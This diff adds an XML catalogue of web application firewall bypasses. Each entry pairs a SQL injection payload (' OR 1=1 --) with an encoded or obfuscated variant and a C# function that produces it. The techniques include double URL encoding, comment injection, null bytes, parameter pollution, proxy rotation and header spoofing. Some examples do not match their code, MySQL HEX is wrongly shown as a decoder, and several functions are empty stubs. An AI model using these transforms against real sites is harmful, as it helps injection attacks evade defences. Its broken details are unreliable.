@@ -1,0 +1,526 @@
+<?xml version="1.0" encoding="utf-8"?>
+<waf_bypasses>
+  <!-- URL Encoding Bypasses -->
+  <bypass category="url_encoding" title="Single URL Encoding">
+    <description>Apply single URL encoding to payload</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>%27%20OR%201%3D1%20%2D%2D</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return Uri.EscapeDataString(payload);
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <bypass category="url_encoding" title="Double URL Encoding">
+    <description>Apply double URL encoding to payload</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>%2527%2520OR%25201%253D1%2520%252D%252D</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          string encoded = Uri.EscapeDataString(payload);
+          return Uri.EscapeDataString(encoded);
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <bypass category="url_encoding" title="Unicode URL Encoding">
+    <description>Apply Unicode URL encoding to payload</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>%u0027%u0020OR%u00201%u003D1%u0020%u002D%u002D</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return string.Join("", payload.Select(c => $"%u{((int)c):X4}"));
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <!-- HTML Entity Encoding Bypasses -->
+  <bypass category="html_encoding" title="HTML Entity Encoding">
+    <description>Apply HTML entity encoding to payload</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>&#39; OR 1=1 --</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return HttpUtility.HtmlEncode(payload);
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <bypass category="html_encoding" title="Hex HTML Entity Encoding">
+    <description>Apply hex HTML entity encoding to payload</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>&#x27; OR 1=1 --</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return string.Join("", payload.Select(c => $"&#x{((int)c):X};"));
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <!-- Base64 Encoding Bypasses -->
+  <bypass category="base64_encoding" title="Base64 Encoding">
+    <description>Apply Base64 encoding to payload</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>JyBPUiAxPTEgLS0=</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return Convert.ToBase64String(Encoding.UTF8.GetBytes(payload));
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <bypass category="base64_encoding" title="Base64 with FROM_BASE64">
+    <description>Apply Base64 encoding with MySQL FROM_BASE64 function</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>FROM_BASE64('JyBPUiAxPTEgLS0=')</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          string encoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(payload));
+          return $"FROM_BASE64('{encoded}')";
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <!-- Hex Encoding Bypasses -->
+  <bypass category="hex_encoding" title="Hex Encoding">
+    <description>Apply hex encoding to payload</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>0x27204F5220313D31202D2D</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return "0x" + string.Join("", Encoding.UTF8.GetBytes(payload).Select(b => b.ToString("X2")));
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <bypass category="hex_encoding" title="MySQL Hex Function">
+    <description>Apply MySQL HEX function to payload</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>HEX('27204F5220313D31202D2D')</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          string hex = string.Join("", Encoding.UTF8.GetBytes(payload).Select(b => b.ToString("X2")));
+          return $"HEX('{hex}')";
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <!-- Case Manipulation Bypasses -->
+  <bypass category="case_manipulation" title="Mixed Case">
+    <description>Apply mixed case to payload</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>' Or 1=1 --</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return new string(payload.Select((c, i) => i % 2 == 0 ? char.ToUpper(c) : char.ToLower(c)).ToArray());
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <bypass category="case_manipulation" title="Random Case">
+    <description>Apply random case to payload</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>' oR 1=1 --</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          var random = new Random();
+          return new string(payload.Select(c => random.Next(2) == 0 ? char.ToUpper(c) : char.ToLower(c)).ToArray());
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <!-- Comment Injection Bypasses -->
+  <bypass category="comment_injection" title="MySQL Comment Injection">
+    <description>Inject MySQL comments into payload</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>' /**/OR/**/1=1/**/ --</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload.Replace(" ", "/**/");
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <bypass category="comment_injection" title="Double Dash Comment">
+    <description>Use double dash comments</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>' OR 1=1 --comment</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload.Replace("--", "--comment");
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <bypass category="comment_injection" title="Hash Comment">
+    <description>Use hash comments</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>' OR 1=1 #</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload.Replace("--", "#");
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <!-- Whitespace Manipulation Bypasses -->
+  <bypass category="whitespace_manipulation" title="Tab Replacement">
+    <description>Replace spaces with tabs</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>'	OR	1=1	--</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload.Replace(" ", "\t");
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <bypass category="whitespace_manipulation" title="Newline Replacement">
+    <description>Replace spaces with newlines</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>'
+OR
+1=1
+--</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload.Replace(" ", "\n");
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <bypass category="whitespace_manipulation" title="Multiple Spaces">
+    <description>Replace single spaces with multiple spaces</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>'    OR    1=1    --</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload.Replace(" ", "    ");
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <!-- Operator Alternative Bypasses -->
+  <bypass category="operator_alternatives" title="AND to &amp;&amp;">
+    <description>Replace AND with &amp;&amp;</description>
+    <example>
+      <original>' AND 1=1 --</original>
+      <encoded>' &amp;&amp; 1=1 --</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload.Replace(" AND ", " && ");
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <bypass category="operator_alternatives" title="OR to ||">
+    <description>Replace OR with ||</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>' || 1=1 --</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload.Replace(" OR ", " || ");
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <!-- String Concatenation Bypasses -->
+  <bypass category="string_concatenation" title="MySQL CONCAT">
+    <description>Use MySQL CONCAT function</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>' OR CONCAT('1','=','1') --</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload.Replace("1=1", "CONCAT('1','=','1')");
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <bypass category="string_concatenation" title="MSSQL String Concatenation">
+    <description>Use MSSQL string concatenation</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>' OR '1'+'='+'1' --</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload.Replace("1=1", "'1'+'='+'1'");
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <!-- Function Alternative Bypasses -->
+  <bypass category="function_alternatives" title="SUBSTR to SUBSTRING">
+    <description>Replace SUBSTR with SUBSTRING</description>
+    <example>
+      <original>SUBSTR(version(),1,1)</original>
+      <encoded>SUBSTRING(version(),1,1)</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload.Replace("SUBSTR(", "SUBSTRING(");
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <bypass category="function_alternatives" title="SUBSTRING to MID">
+    <description>Replace SUBSTRING with MID</description>
+    <example>
+      <original>SUBSTRING(version(),1,1)</original>
+      <encoded>MID(version(),1,1)</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload.Replace("SUBSTRING(", "MID(");
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <!-- Null Byte Injection Bypasses -->
+  <bypass category="null_byte_injection" title="Null Byte Injection">
+    <description>Inject null bytes into payload</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>'\x00 OR 1=1 --</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload.Replace("'", "'\x00");
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <bypass category="null_byte_injection" title="URL Null Byte">
+    <description>Use URL encoded null byte</description>
+    <example>
+      <original>' OR 1=1 --</original>
+      <encoded>'%00 OR 1=1 --</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload.Replace("'", "'%00");
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <!-- HTTP Parameter Pollution Bypasses -->
+  <bypass category="hpp" title="HTTP Parameter Pollution">
+    <description>Duplicate parameters with different values</description>
+    <example>
+      <original>id=1' OR 1=1 --</original>
+      <encoded>id=1&amp;id=1' OR 1=1 --</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          if (payload.Contains("=")) {
+            var parts = payload.Split('=', 2);
+            return $"{parts[0]}={parts[1]}&{parts[0]}={parts[1]}";
+          }
+          return payload;
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <!-- HTTP Verb Tampering Bypasses -->
+  <bypass category="http_verb_tampering" title="POST to GET">
+    <description>Change HTTP method from POST to GET</description>
+    <example>
+      <original>POST /login</original>
+      <encoded>GET /login</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload; // This would be handled at the HTTP level
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <!-- Charset Confusion Bypasses -->
+  <bypass category="charset_confusion" title="UTF-8 to UTF-16">
+    <description>Change charset to cause confusion</description>
+    <example>
+      <original>Content-Type: application/x-www-form-urlencoded</original>
+      <encoded>Content-Type: application/x-www-form-urlencoded; charset=utf-16</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload; // This would be handled at the HTTP level
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <!-- Rate Limiting Bypass -->
+  <bypass category="rate_limiting" title="Delay Injection">
+    <description>Add delays between requests</description>
+    <example>
+      <original>Rapid requests</original>
+      <encoded>Delayed requests with random intervals</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload; // This would be handled at the request level
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <!-- IP Rotation Bypasses -->
+  <bypass category="ip_rotation" title="Proxy Rotation">
+    <description>Rotate through different proxy IPs</description>
+    <example>
+      <original>Single IP requests</original>
+      <encoded>Multiple IP requests via proxies</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload; // This would be handled at the connection level
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <!-- User-Agent Rotation Bypasses -->
+  <bypass category="user_agent_rotation" title="User-Agent Rotation">
+    <description>Rotate through different User-Agent strings</description>
+    <example>
+      <original>Mozilla/5.0 (Windows NT 10.0; Win64; x64)</original>
+      <encoded>Various User-Agent strings</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload; // This would be handled at the header level
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <!-- Header Manipulation Bypasses -->
+  <bypass category="header_manipulation" title="X-Forwarded-For">
+    <description>Add X-Forwarded-For header</description>
+    <example>
+      <original>Direct request</original>
+      <encoded>X-Forwarded-For: 127.0.0.1</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload; // This would be handled at the header level
+        }
+      ]]>
+    </script>
+  </bypass>
+  
+  <bypass category="header_manipulation" title="X-Real-IP">
+    <description>Add X-Real-IP header</description>
+    <example>
+      <original>Direct request</original>
+      <encoded>X-Real-IP: 127.0.0.1</encoded>
+    </example>
+    <script>
+      <![CDATA[
+        public string Apply(string payload) {
+          return payload; // This would be handled at the header level
+        }
+      ]]>
+    </script>
+  </bypass>
+</waf_bypasses>
